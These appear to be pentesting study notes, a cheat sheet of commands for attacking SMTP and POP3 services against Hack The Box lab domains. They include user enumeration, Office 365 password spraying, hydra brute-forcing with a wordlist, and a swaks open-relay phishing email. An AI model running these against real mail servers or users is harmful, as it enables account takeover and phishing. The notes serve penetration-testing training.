---
title: smtp
aliases:
tags:
---

# smtp

- enumeration
    - host 
        - `host -t MX $domainname`
        - get ip address `host -t A mail1.$domainname.`
    - dig `dig mx $domainname | grep "MX" | grep -v ";"`
    - nmap `sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 $ip`
- connect
    - `telnet $ip 25`
        - search for valid accounts
            - `VRFY $username`
            - `EXPN $username` shows users in distribution lists
            - `RCPT TO:julio` will confirm if a username exists
    - pop3 `telnet $ip 110`
        - `USER julio` confirm user exists
        - authenticate
            - `user validuser@domain.htb`
            - `pass Password123!`
        - actions
            - `list` emails
            - `retr 2`  read email
            - `dele 1`  delete email
            - `quit`    exit        
    - [smtp-user-enum](https://github.com/pentestmonkey/smtp-user-enum)
        - `smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t $ip`
            - `-M ` VRFY, EXPN, or RCPT always try them all
    - 0365
        - [o365spray](https://github.com/0xZDH/o365spray)
            - verify target uses 365 `python3 o365spray.py --validate --domain $domainname`
            - verify usernames `python3 o365spray.py --enum -U users.txt --domain $domain`
            - password spray `python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain $domain`
        - [mailsniper](https://github.com/dafthack/MailSniper)
    - gmail/okta
        - [credking](https://github.com/ustayready/CredKing)
    - brute force
        - hydra 
            - `hydra -L users.txt -p 'Company01!' -f $ip pop3`        smtp|pop3   
            - `hydra -l marlin@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt -f $ip smtp -t 32 -v` remember to add full email, not just username
    - phishing
        - open relay `nmap -p25 -Pn --script smtp-open-relay $ip`
            - `swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Please complete the following survey. http://mycustomphishinglink.com/' --server $ip`
        - 